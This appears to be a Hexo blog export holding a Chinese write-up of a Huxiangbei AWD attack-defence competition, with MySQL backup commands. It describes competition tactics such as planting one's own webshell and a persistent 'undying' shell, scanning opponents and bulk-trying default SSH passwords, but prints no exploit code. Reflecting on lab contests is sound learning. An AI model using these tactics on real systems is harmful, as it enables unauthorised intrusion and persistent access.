href=\"#其他命令参考\" class=\"headerlink\" title=\"其他命令参考:\"></a><strong>其他命令参考:</strong></h3><p>备份远程MySQL数据库的命令</p>\n<pre><code>mysqldump -h[hostname] -u[username] -p[password] [databasename] &gt; backupfile.sql</code></pre><p>备份MySQL数据库为带删除表的格式备份MySQL数据库为带删除表的格式，能够让该备份覆盖已有数据库而不需要手动删除原有数据库。</p>\n<pre><code>mysqldump ---add-drop-table -u[username] -p[password] [databasename] &gt; backupfile.sql</code></pre><p>（远程）直接将MySQL数据库压缩备份</p>\n<pre><code>mysqldump -h[hostname] -u[username] -p[password] [databasename] | gzip &gt; backupfile.sql.gz</code></pre><p>（远程）备份MySQL数据库某个(些)表</p>\n<pre><code>mysqldump -h[hostname] -u[username] -p[password] [databasename] [table1 table2] &gt; backupfile.sql</code></pre><p>（远程）同时备份多个MySQL数据库</p>\n<pre><code>mysqldump -h[hostname] -u[username] -p[password] --databases [databasename1 databasename2 databasename3] &gt; multibackupfile.sql</code></pre><p>仅仅备份数据库结构</p>\n<pre><code>mysqldump -u[username] -p[password] --no-data --databases [databasename1 databasename2 databasename3] &gt; structurebackupfile.sql</code></pre><p>备份服务器上所有数据库</p>\n<pre><code>mysqldump -u[username] -p[password] --all-databases &gt; allbackupfile.sql</code></pre><p>（远程）还原MySQL数据库的命令</p>\n<pre><code>mysql -h[hostname] -u[username] -p[password] [databasename] &lt; backupfile.sql</code></pre><p>还原压缩的MySQL数据库</p>\n<pre><code>gunzip &lt; backupfile.sql.gz | mysql -u[username] -p[password] [databasename]</code></pre><h3 id=\"简单粗暴的方法\"><a href=\"#简单粗暴的方法\" class=\"headerlink\" title=\"简单粗暴的方法\"></a>简单粗暴的方法</h3><p><strong>备份，直接复制整个数据库目录</strong></p>\n<p>　　MySQL有一种非常简单的备份方法，就是将MySQL中的数据库文件直接复制出来。这是最简单，速度最快的方法。</p>\n<p>不过在此之前，要先将服务器停止，这样才可以保证在复制期间数据库的数据不会发生变化。如果在复制数据库的过程中还有数据写入，就会造成数据不一致。这种情况在开发环境可以，但是在生产环境中很难允许备份服务器。</p>\n<p>　　注意：这种方法不适用于InnoDB存储引擎的表，而对于MyISAM存储引擎的表很方便。同时，还原时MySQL的版本最好相同。</p>\n<p><strong>还原，直接替换复制目录的备份</strong></p>\n<p> 　　通过这种方式还原时，必须保证两个MySQL数据库的版本号是相同的。MyISAM类型的表有效，对于InnoDB类型的表不可用，InnoDB表的表空间不能直接复制。</p>\n"},{"layout":"post","title":"湖湘杯AWD线下赛总结","date":"2020-11-17T16:00:00.000Z","description":"总结？总结个屁，老子就是去挨打的。","typora-root-url":"..","_content":"\n\n\n# 湖湘杯AWD线下赛总结\n\n第一次参加线下赛，之前看了很多资料做了很多准备，心里也确实紧张，去之前心里一直非常焦灼。\n\n对于没把握的事非常非常紧张，这或许是我个人的一个重大缺点，经常使我难以良好的做到临场发挥，并且在行动之前自暴自弃。\n\n比赛分上午下午两场，上午是线下做题模式，下午是AWD攻防。\n\n上午的做题给了提交平台的ip地址和本队的用户名密码，还有靶机ip。\n\n我们的主机是用一根网线连进了一个198开头的局域网里，靶机在172，这两个局域网连接起来的。\n\n刚开始真的很懵，没料到还有这一出，以为上午下午都是攻防。突然来这一出，导致一开始没有想到要连靶机，就是埋着头硬写题。\n\n第一个flag是经典送分题，御剑扫一下目录，发现目录下wwwroot.zip文件，直接给源码 ，下载下来主目录就有一个名为flag的无后缀文件，出于谨慎考虑，我还放kali里file了一下文件类型，发现是text，然后直接改后缀为txt，得到flag，这时队友已经提交了。\n\n然后就是robots.txt，内容是\n\n```\ndisallow:/admin/\n```\n\n不允许访问admin目录\n\n看一看源文件，主页是index.php,于是改url为 http://ip/index.php/admin/ ，成功来到管理员登陆界面。\n\nsqlmap注入失败，burpsuite暴破失败。队友找到了runtime目录下的log文件，结果由于我做题经验稀缺，一直被那个虚假的admin用户密码迷惑，又不敢直接否定或肯定自己的思路，费了很多时间，赛后大佬告诉我账号密码就在那个log文件里，只是我没找对地方而已。\n\n![](/img/image-20201117181349246.png)\n\n下午AWD攻防，前半个小时加固，备份靶机，然后开放攻击。之前我们都没参加过AWD，不知道该怎么办，就准备了很多攻击防御框架，脚本。\n\n然而实战怎么没用上。又很多问题遇到了以后不太敢搞，然后队友会的我也会，我不会的队友也不会，配合性也很差。\n\n过程没啥好说，直接总结问题：\n\n### 一、\n\n其实要第一时间准备好的东西其实不是什么攻击脚本，流量监控脚本，那东西变数太大。\n\n要准备的是：个人shell，不死马文件，记事本打开，虚拟机打开，蚁剑打开，工作目录准备好\n\n起手工作其实要做的就是把所有能提前准备好的东西准备好，得以让比赛开始后省去不必要的时间开销。开放攻击前的半个小时\n\n就是争分夺秒，时间就是生命。改ssh密码，备份网站目录，备份数据库，D盾查杀木马，上传自己的🐎，这全要一气呵成，在攻击开放前搞完，否则大佬的批量化攻击脚本会瞬间攻陷你的主机，另一队的靶机1的数据库早早就被删了，我们运气好，被删的晚。\n\n这里放一下数据库备份还原方法：\n\n\n\n**如何使用CLI备份数据库**\n\n使用MySQL提供的mysqldump工具，备份或导出MySQL数据库非常容易。\n\n```shell\nmysqldump -u[uname] -p[pass] [dbname] > [backupfile].sql\n```\n\n\n\n- [uname] - 是有权访问数据库的用户的名称；\n- [pass] - 用户密码；\n- [dbname] - 是要备份或导出的数据库的名称；\n- [backupfile] - 是备份文件的名称。\n\n提供一个示例数据库配置，比如要将mysql这个数据库导出为一个文件名为mysql-back.sql的数据库文件到当前目录下，则输入下面的命令：\n\n```shell\n[liloong@localhost ~/Backup]$mysqldump -uroot -proot mysql > mysql-back.sql\n```\n\n用户名：root  密码：root 数据库名：mysql  备份的数据库为：mysql-back.sql\n\n需要注意的地方是：-p后面直接跟用户名和密码，不要有空格。但-u后面可以有。\n\n**如何使用CLI还原数据库**\n\n恢复或导入我们先前备份的MySQL数据库文件的另一种方法是使用mysql就像备份或导出数据库一样简单。\n\n```php\nmysql -u[uname] -p[pass] [dbname] < [backupfile].sql\n```\n\n\n\n- [uname] - 是有权访问数据库的用户名；\n- [pass] - 用户密码；\n- [dbname] - 是要还原或导入的数据库的名称；\n- [backupfile] - 是还原文件的名称。\n\n然后攻击就开始了，第一件事，扫对手的IP，所以kali可以早早的开好，把命令也准备好，开放以后直接用nmap或者赶时间用masscan扫，扫出来以后甚至可以尝试用ssh默认密码或靶机里原始的shell密码批量连接一下，因为真的有人不知道改ssh密码的！\n\n### 二、挖洞\n\n这次比赛，防御不防御的根本不是最重要的，最重要的是攻击！一个别人没有审计出的漏洞几乎就可以抵消大佬对你造成的所有伤害了。\n\n**代码审计！**要加强！**挖洞**！这才是AWD的核心！\n\n什么批量化脚本，什么流量监控，在我们现在这个阶段就是空话！真正的大佬都是现场写脚本的！要想把这些脚本用好，下次得把它们的源码研究了，了解了原理，才能最大限度地发挥作用。\n\n而只要挖到了一个大部分人没掌握的洞，后续输出就像割韭菜一样。\n\n\n\n### 三、技术细节\n\n有很技术细节真的是不来参加一次比赛接触不到的。\n\n比如不死马。其原理和克制方法，网上一查，全都说的头头是道的，实际操作起来可能完全不一样。比如这次，网上说使用\n\n```shell\nps aux\n```\n\n命令查看进程，然后 \n\n```shell\nkill -9 [PID]\n```\n\n杀进程，就能把不死马进程杀掉了。然而，不死马进程的权限是www-data用户的，我们所使用的赛方提供的ubuntu用户根本杀不了它的进程，又或是由于它在不断动态生成，导致进程的PID一直在变(这一段不知道说的对不对)。反正它显示，“不存在该PID的进程”。\n\n但赛后大佬说直接杀掉全部apache2进程就行了，利用自己传的shell执行命令\n\n```shell\nkillall apache2\n```\n\n直接让apache2重启，所有相关进程自然没有了\n\n还有大佬说这次主办方直接在靶机里留了Busybox,\n\n![](/img/image-20201117211912516.png)\n\n使用\n\n```shell\n/bin/busybox sh\n```\n\n使用busybox,就可以随便搞了，任意执行命令，这样就可以执行比赛前准备的第三方脚本而不用担心没有权限了。\n\n又或者，如果没有执行权限，可以先给要执行的文件+x，然后用scp命令传上靶机，因为scp命令是带权限复制的（又是一个非常有用的小细节）\n\n\n\n然后，我们这次没扫出对面ip ,完全是我自己傻逼了的原因。因为之前没用过nmap和masscan, 完全通过文档学习。一开始扫不出东西，我还以为是我命令输错 了，懵逼了好久，然后后来想到了可能D段里没有别的主机了，不同选手的靶机可能在不同的C段，然后nmap扫，扫了快十分钟没扫出来（后来知道选手的靶机在100-150），放弃了，主要是当时心态炸了。\n\n这次知道了我操作的没问题，下次就会自信多了\n\n\n\n这次的AWD只能说惨淡收场，但明年再战的时候，必重拳出击","source":"_posts/2020-11-18-湖湘杯线下AWD总结.md","raw":"---\nlayout: post\ntitle: 湖湘杯AWD线下赛总结\ndate: 2020-11-18\ncategories: blog\ntags: [web,AWD]\ndescription: 总结？总结个屁，老子就是去挨打的。\ntypora-root-url: ..\n---\n\n\n\n# 湖湘杯AWD线下赛总结\n\n第一次参加线下赛，之前看了很多资料做了很多准备，心里也确实紧张，去之前心里一直非常焦灼。\n\n对于没把握的事非常非常紧张，这或许是我个人的一个重大缺点，经常使我难以良好的做到临场发挥，并且在行动之前自暴自弃。\n\n比赛分上午下午两场，上午是线下做题模式，下午是AWD攻防。\n\n上午的做题给了提交平台的ip地址和本队的用户名密码，还有靶机ip。\n\n我们的主机是用一根网线连进了一个198开头的局域网里，靶机在172，这两个局域网连接起来的。\n\n刚开始真的很懵，没料到还有这一出，以为上午下午都是攻防。突然来这一出，导致一开始没有想到要连靶机，就是埋着头硬写题。\n\n第一个flag是经典送分题，御剑扫一下目录，发现目录下wwwroot.zip文件，直接给源码 ，下载下来主目录就有一个名为flag的无后缀文件，出于谨慎考虑，我还放kali里file了一下文件类型，发现是text，然后直接改后缀为txt，得到flag，这时队友已经提交了。\n\n然后就是robots.txt，内容是\n\n```\ndisallow:/admin/\n```\n\n不允许访问admin目录\n\n看一看源文件，主页是index.php,于是改url为 http://ip/index.php/admin/ ，成功来到管理员登陆界面。\n\nsqlmap注入失败，burpsuite暴破失败。队友找到了runtime目录下的log文件，结果由于我做题经验稀缺，一直被那个虚假的admin用户密码迷惑，又不敢直接否定或肯定自己的思路，费了很多时间，赛后大佬告诉我账号密码就在那个log文件里，只是我没找对地方而已。\n\n![](/img/image-20201117181349246.png)\n\n下午AWD攻防，前半个小时加固，备份靶机，然后开放攻击。之前我们都没参加过AWD，不知道该怎么办，就准备了很多攻击防御框架，脚本。\n\n然而实战怎么没用上。又很多问题遇到了以后不太敢搞，然后队友会的我也会，我不会的队友也不会，配合性也很差。\n\n过程没啥好说，直接总结问题：\n\n### 一、\n\n其实要第一时间准备好的东西其实不是什么攻击脚本，流量监控脚本，那东西变数太大。\n\n要准备的是：个人shell，不死马文件，记事本打开，虚拟机打开，蚁剑打开，工作目录准备好\n\n起手工作其实要做的就是把所有能提前准备好的东西准备好，得以让比赛开始后省去不必要的时间开销。开放攻击前的半个小时\n\n就是争分夺秒，时间就是生命。改ssh密码，备份网站目录，备份数据库，D盾查杀木马，上传自己的🐎，这全要一气呵成，在攻击开放前搞完，否则大佬的批量化攻击脚本会瞬间攻陷你的主机，另一队的靶机1的数据库早早就被删了，我们运气好，被删的晚。\n\n这里放一下数据库备份还原方法：\n\n\n\n**如何使用CLI备份数据库**\n\n使用MySQL提供的mysqldump工具，备份或导出MySQL数据库非常容易。\n\n```shell\nmysqldump -u[uname] -p[pass] [dbname] > [backupfile].sql\n```\n\n\n\n- [uname] - 是有权访问数据库的用户的名称；\n- [pass] - 用户密码；\n- [dbname] - 是要备份或导出的数据库的名称；\n- [backupfile] - 是备份文件的名称。\n\n提供一个示例数据库配置，比如要将mysql这个数据库导出为一个文件名为mysql-back.sql的数据库文件到当前目录下，则输入下面的命令：\n\n```shell\n[liloong@localhost ~/Backup]$mysqldump -uroot -proot mysql > mysql-back.sql\n```\n\n用户名：root  密码：root 数据库名：mysql  备份的数据库为：mysql-back.sql\n\n需要注意的地方是：-p后面直接跟用户名和密码，不要有空格。但-u后面可以有。\n\n**如何使用CLI还原数据库**\n\n恢复或导入我们先前备份的MySQL数据库文件的另一种方法是使用mysql就像备份或导出数据库一样简单。\n\n```php\nmysql -u[uname] -p[pass] [dbname] < [backupfile].sql\n```\n\n\n\n- [uname] - 是有权访问数据库的用户名；\n- [pass] - 用户密码；\n- [dbname] - 是要还原或导入的数据库的名称；\n- [backupfile] - 是还原文件的名称。\n\n然后攻击就开始了，第一件事，扫对手的IP，所以kali可以早早的开好，把命令也准备好，开放以后直接用nmap或者赶时间用masscan扫，扫出来以后甚至可以尝试用ssh默认密码或靶机里原始的shell密码批量连接一下，因为真的有人不知道改ssh密码的！\n\n### 二、挖洞\n\n这次比赛，防御不防御的根本不是最重要的，最重要的是攻击！一个别人没有审计出的漏洞几乎就可以抵消大佬对你造成的所有伤害了。\n\n**代码审计！**要加强！**挖洞**！这才是AWD的核心！\n\n什么批量化脚本，什么流量监控，在我们现在这个阶段就是空话！真正的大佬都是现场写脚本的！要想把这些脚本用好，下次得把它们的源码研究了，了解了原理，才能最大限度地发挥作用。\n\n而只要挖到了一个大部分人没掌握的洞，后续输出就像割韭菜一样。\n\n\n\n### 三、技术细节\n\n有很技术细节真的是不来参加一次比赛接触不到的。\n\n比如不死马。其原理和克制方法，网上一查，全都说的头头是道的，实际操作起来可能完全不一样。比如这次，网上说使用\n\n```shell\nps aux\n```\n\n命令查看进程，然后 \n\n```shell\nkill -9 [PID]\n```\n\n杀进程，就能把不死马进程杀掉了。然而，不死马进程的权限是www-data用户的，我们所使用的赛方提供的ubuntu用户根本杀不了它的进程，又或是由于它在不断动态生成，导致进程的PID一直在变(这一段不知道说的对不对)。反正它显示，“不存在该PID的进程”。\n\n但赛后大佬说直接杀掉全部apache2进程就行了，利用自己传的shell执行命令\n\n```shell\nkillall apache2\n```\n\n直接让apache2重启，所有相关进程自然没有了\n\n还有大佬说这次主办方直接在靶机里留了Busybox,\n\n![](/img/image-20201117211912516.png)\n\n使用\n\n```shell\n/bin/busybox sh\n```\n\n使用busybox,就可以随便搞了，任意执行命令，这样就可以执行比赛前准备的第三方脚本而不用担心没有权限了。\n\n又或者，如果没有执行权限，可以先给要执行的文件+x，然后用scp命令传上靶机，因为scp命令是带权限复制的（又是一个非常有用的小细节）\n\n\n\n然后，我们这次没扫出对面ip ,完全是我自己傻逼了的原因。因为之前没用过nmap和masscan, 完全通过文档学习。一开始扫不出东西，我还以为是我命令输错 了，懵逼了好久，然后后来想到了可能D段里没有别的主机了，不同选手的靶机可能在不同的C段，然后nmap扫，扫了快十分钟没扫出来（后来知道选手的靶机在100-150），放弃了，主要是当时心态炸了。\n\n这次知道了我操作的没问题，下次就会自信多了\n\n\n\n这次的AWD只能说惨淡收场，但明年再战的时候，必重拳出击","slug":"2020-11-18-湖湘杯线下AWD总结","published":1,"updated":"2020-11-20T02:12:13.302Z","comments":1,"photos":[],"link":"","_id":"ckkntx9ju0013xov7m7zjwxie","content":"<h1 id=\"湖湘杯AWD线下赛总结\"><a href=\"#湖湘杯AWD线下赛总结\" class=\"headerlink\" title=\"湖湘杯AWD线下赛总结\"></a>湖湘杯AWD线下赛总结</h1><p>第一次参加线下赛，之前看了很多资料做了很多准备，心里也确实紧张，去之前心里一直非常焦灼。</p>\n<p>对于没把握的事非常非常紧张，这或许是我个人的一个重大缺点，经常使我难以良好的做到临场发挥，并且在行动之前自暴自弃。</p>\n<p>比赛分上午下午两场，上午是线下做题模式，下午是AWD攻防。</p>\n<p>上午的做题给了提交平台的ip地址和本队的用户名密码，还有靶机ip。</p>\n<p>我们的主机是用一根网线连进了一个198开头的局域网里，靶机在172，这两个局域网连接起来的。</p>\n<p>刚开始真的很懵，没料到还有这一出，以为上午下午都是攻防。突然来这一出，导致一开始没有想到要连靶机，就是埋着头硬写题。</p>\n<p>第一个flag是经典送分题，御剑扫一下目录，发现目录下wwwroot.zip文件，直接给源码 ，下载下来主目录就有一个名为flag的无后缀文件，出于谨慎考虑，我还放kali里file了一下文件类型，发现是text，然后直接改后缀为txt，得到flag，这时队友已经提交了。</p>\n<p>然后就是robots.txt，内容是</p>\n<pre><code>disallow:/admin/</code></pre><p>不允许访问admin目录</p>\n<p>看一看源文件，主页是index.php,于是改url为 <a href=\"http://ip/index.php/admin/\" target=\"_blank\" rel=\"noopener\">http://ip/index.php/admin/</a> ，成功来到管理员登陆界面。</p>\n<p>sqlmap注入失败，burpsuite暴破失败。队友找到了runtime目录下的log文件，结果由于我做题经验稀缺，一直被那个虚假的admin用户密码迷惑，又不敢直接否定或肯定自己的思路，费了很多时间，赛后大佬告诉我账号密码就在那个log文件里，只是我没找对地方而已。</p>\n<p><img src=\"/img/image-20201117181349246.png\" alt=\"\"></p>\n<p>下午AWD攻防，前半个小时加固，备份靶机，然后开放攻击。之前我们都没参加过AWD，不知道该怎么办，就准备了很多攻击防御框架，脚本。</p>\n<p>然而实战怎么没用上。又很多问题遇到了以后不太敢搞，然后队友会的我也会，我不会的队友也不会，配合性也很差。</p>\n<p>过程没啥好说，直接总结问题：</p>\n<h3 id=\"一、\"><a href=\"#一、\" class=\"headerlink\" title=\"一、\"></a>一、</h3><p>其实要第一时间准备好的东西其实不是什么攻击脚本，流量监控脚本，那东西变数太大。</p>\n<p>要准备的是：个人shell，不死马文件，记事本打开，虚拟机打开，蚁剑打开，工作目录准备好</p>\n<p>起手工作其实要做的就是把所有能提前准备好的东西准备好，得以让比赛开始后省去不必要的时间开销。开放攻击前的半个小时</p>\n<p>就是争分夺秒，时间就是生命。改ssh密码，备份网站目录，备份数据库，D盾查杀木马，上传自己的🐎，这全要一气呵成，在攻击开放前搞完，否则大佬的批量化攻击脚本会瞬间攻陷你的主机，另一队的靶机1的数据库早早就被删了，我们运气好，被删的晚。</p>\n<p>这里放一下数据库备份还原方法：</p>\n<p><strong>如何使用CLI备份数据库</strong></p>\n<p>使用MySQL提供的mysqldump工具，备份或导出MySQL数据库非常容易。</p>\n<pre class=\"line-numbers language-shell\"><code class=\"language-shell\">mysqldump -u[uname] -p[pass] [dbname] > [backupfile].sql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<ul>\n<li>[uname] - 是有权访问数据库的用户的名称；</li>\n<li>[pass] - 用户密码；</li>\n<li>[dbname] - 是要备份或导出的数据库的名称；</li>\n<li>[backupfile] - 是备份文件的名称。</li>\n</ul>\n<p>提供一个示例数据库配置，比如要将mysql这个数据库导出为一个文件名为mysql-back.sql的数据库文件到当前目录下，则输入下面的命令：</p>\n<pre class=\"line-numbers language-shell\"><code class=\"language-shell\">[liloong@localhost ~/Backup]$mysqldump -uroot -proot mysql > mysql-back.sql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>用户名：root  密码：root 数据库名：mysql  备份的数据库为：mysql-back.sql</p>\n<p>需要注意的地方是：-p后面直接跟用户名和密码，不要有空格。但-u后面可以有。</p>\n<p><strong>如何使用CLI还原数据库</strong></p>\n<p>恢复或导入我们先前备份的MySQL数据库文件的另一种方法是使用mysql就像备份或导出数据库一样简单。</p>\n<pre class=\"line-numbers language-php\"><code class=\"language-php\">mysql <span class=\"token operator\">-</span>u<span class=\"token punctuation\">[</span>uname<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span>p<span class=\"token punctuation\">[</span>pass<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>dbname<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token punctuation\">[</span>backupfile<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>sql<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<ul>\n<li>[uname] - 是有权访问数据库的用户名；</li>\n<li>[pass] - 用户密码；</li>\n<li>[dbname] - 是要还原或导入的数据库的名称；</li>\n<li>[backupfile] - 是还原文件的名称。</li>\n</ul>\n<p>然后攻击就开始了，第一件事，扫对手的IP，所以kali可以早早的开好，把命令也准备好，开放以后直接用nmap或者赶时间用masscan扫，扫出来以后甚至可以尝试用ssh默认密码或靶机里原始的shell密码批量连接一下，因为真的有人不知道改ssh密码的！</p>\n<h3 id=\"二、挖洞\"><a href=\"#二、挖洞\" class=\"headerlink\" title=\"二、挖洞\"></a>二、挖洞</h3><p>这次比赛，防御不防御的根本不是最重要的，最重要的是攻击！一个别人没有审计出的漏洞几乎就可以抵消大佬对你造成的所有伤害了。</p>\n<p><strong>代码审计！</strong>要加强！<strong>挖洞</strong>！这才是AWD的核心！</p>\n<p>什么批量化脚本，什么流量监控，在我们现在这个阶段就是空话！真正的大佬都是现场写脚本的！要想把这些脚本用好，下次得把它们的源码研究了，了解了原理，才能最大限度地发挥作用。</p>\n<p>而只要挖到了一个大部分人没掌握的洞，后续输出就像割韭菜一样。</p>\n<h3 id=\"三、技术细节\"><a href=\"#三、技术细节\" class=\"headerlink\" title=\"三、技术细节\"></a>三、技术细节</h3><p>有很技术细节真的是不来参加一次比赛接触不到的。</p>\n<p>比如不死马。其原理和克制方法，网上一查，全都说的头头是道的，实际操作起来可能完全不一样。比如这次，网上说使用</p>\n<pre class=\"line-numbers language-shell\"><code class=\"language-shell\">ps aux<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>命令查看进程，然后 </p>\n<pre class=\"line-numbers language-shell\"><code class=\"language-shell\">kill -9 [PID]<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>杀进程，就能把不死马进程杀掉了。然而，不死马进程的权限是www-data用户的，我们所使用的赛方提供的ubuntu用户根本杀不了它的进程，又或是由于它在不断动态生成，导致进程的PID一直在变(这一段不知道说的对不对)。反正它显示，“不存在该PID的进程”。</p>\n<p>但赛后大佬说直接杀掉全部apache2进程就行了，利用自己传的shell执行命令</p>\n<pre class=\"line-numbers language-shell\"><code class=\"language-shell\">killall apache2<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>直接让apache2重启，所有相关进程自然没有了</p>\n<p>还有大佬说这次主办方直接在靶机里留了Busybox,</p>\n<p><img src=\"/img/image-20201117211912516.png\" alt=\"\"></p>\n<p>使用</p>\n<pre class=\"line-numbers language-shell\"><code class=\"language-shell\">/bin/busybox sh<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>使用busybox,就可以随便搞了，任意执行命令，这样就可以执行比赛前准备的第三方脚本而不用担心没有权限了。</p>\n<p>又或者，如果没有执行权限，可以先给要执行的文件+x，然后用scp命令传上靶机，因为scp命令是带权限复制的（又是一个非常有用的小细节）</p>\n<p>然后，我们这次没扫出对面ip ,完全是我自己傻逼了的原因。因为之前没用过nmap和masscan, 完全通过文档学习。一开始扫不出东西，我还以为是我命令输错 了，懵逼了好久，然后后来想到了可能D段里没有别的主机了，不同选手的靶机可能在不同的C段，然后nmap扫，扫了快十分钟没扫出来（后来知道选手的靶机在100-150），放弃了，主要是当时心态炸了。</p>\n<p>这次知道了我操作的没问题，下次就会自信多了</p>\n<p>这次的AWD只能说惨淡收场，但明年再战的时候，必重拳出击</p>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg","背景图片/bg_pic_164.jpg","背景图片/bg_pic_165.jpg"]}],"friends":[{"name":"Liloong3tの博客","introduction":"CTFer","url":"http://liloong3t.com","title":"去看看","avatar":"/favicon.png"},{"name":"wust-ais","url":"https://wust-ais.github.io/","title":"访问主页","introduction":"武汉科技大学信安协会欢迎您的加入！","avatar":"/medias/avatars/wust-ais.png"},{"name":"Blinkfox","url":"https://blinkfox.github.io","title":"前去学习","introduction":"闪烁之狐大佬做的hexo主题很棒，人也很好！","avatar":"https://blinkfox.github.io/medias/avatar.jpg"}]}},"excerpt":"","more":"<h1 id=\"湖湘杯AWD线下赛总结\"><a href=\"#湖湘杯AWD线下赛总结\" class=\"headerlink\" title=\"湖湘杯AWD线下赛总结\"></a>湖湘杯AWD线下赛总结</h1><p>第一次参加线下赛，之前看了很多资料做了很多准备，心里也确实紧张，去之前心里一直非常焦灼。</p>\n<p>对于没把握的事非常非常紧张，这或许是我个人的一个重大缺点，经常使我难以良好的做到临场发挥，并且在行动之前自暴自弃。</p>\n<p>比赛分上午下午两场，上午是线下做题模式，下午是AWD攻防。</p>\n<p>上午的做题给了提交平台的ip地址和本队的用户名密码，还有靶机ip。</p>\n<p>我们的主机是用一根网线连进了一个198开头的局域网里，靶机在172，这两个局域网连接起来的。</p>\n<p>刚开始真的很懵，没料到还有这一出，以为上午下午都是攻防。突然来这一出，导致一开始没有想到要连靶机，就是埋着头硬写题。</p>\n<p>第一个flag是经典送分题，御剑扫一下目录，发现目录下wwwroot.zip文件，直接给源码 ，下载下来主目录就有一个名为flag的无后缀文件，出于谨慎考虑，我还放kali里file了一下文件类型，发现是text，然后直接改后缀为txt，得到flag，这时队友已经提交了。</p>\n<p>然后就是robots.txt，内容是</p>\n<pre><code>disallow:/admin/</code></pre><p>不允许访问admin目录</p>\n<p>看一看源文件，主页是index.php,于是改url为 <a href=\"http://ip/index.php/admin/\" target=\"_blank\" rel=\"noopener\">http://ip/index.php/admin/</a> ，成功来到管理员登陆界面。</p>\n<p>sqlmap注入失败，burpsuite暴破失败。队友找到了runtime目录下的log文件，结果由于我做题经验稀缺，一直被那个虚假的admin用户密码迷惑，又不敢直接否定或肯定自己的思路，费了很多时间，赛后大佬告诉我账号密码就在那个log文件里，只是我没找对地方而已。</p>\n<p><img src=\"/img/image-20201117181349246.png\" alt></p>\n<p>下午AWD攻防，前半个小时加固，备份靶机，然后开放攻击。之前我们都没参加过AWD，不知道该怎么办，就准备了很多攻击防御框架，脚本。</p>\n<p>然而实战怎么没用上。又很多问题遇到了以后不太敢搞，然后队友会的我也会，我不会的队友也不会，配合性也很差。</p>\n<p>过程没啥好说，直接总结问题：</p>\n<h3 id=\"一、\"><a href=\"#一、\" class=\"headerlink\" title=\"一、\"></a>一、</h3><p>其实要第一时间准备好的东西其实不是什么攻击脚本，流量监控脚本，那东西变数太大。</p>\n<p>要准备的是：个人shell，不死马文件，记事本打开，虚拟机打开，蚁剑打开，工作目录准备好</p>\n<p>起手工作其实要做的就是把所有能提前准备好的东西准备好，得以让比赛开始后省去不必要的时间开销。开放攻击前的半个小时</p>\n<p>就是争分夺秒，时间就是生命。改ssh密码，备份网站目录，备份数据库，D盾查杀木马，上传自己的🐎，这全要一气呵成，在攻击开放前搞完，否则大佬的批量化攻击脚本会瞬间攻陷你的主机，另一队的靶机1的数据库早早就被删了，我们运气好，被删的晚。</p>\n<p>这里放一下数据库备份还原方法：</p>\n<p><strong>如何使用CLI备份数据库</strong></p>\n<p>使用MySQL提供的mysqldump工具，备份或导出MySQL数据库非常容易。</p>\n<pre><code class=\"shell\">mysqldump -u[uname] -p[pass] 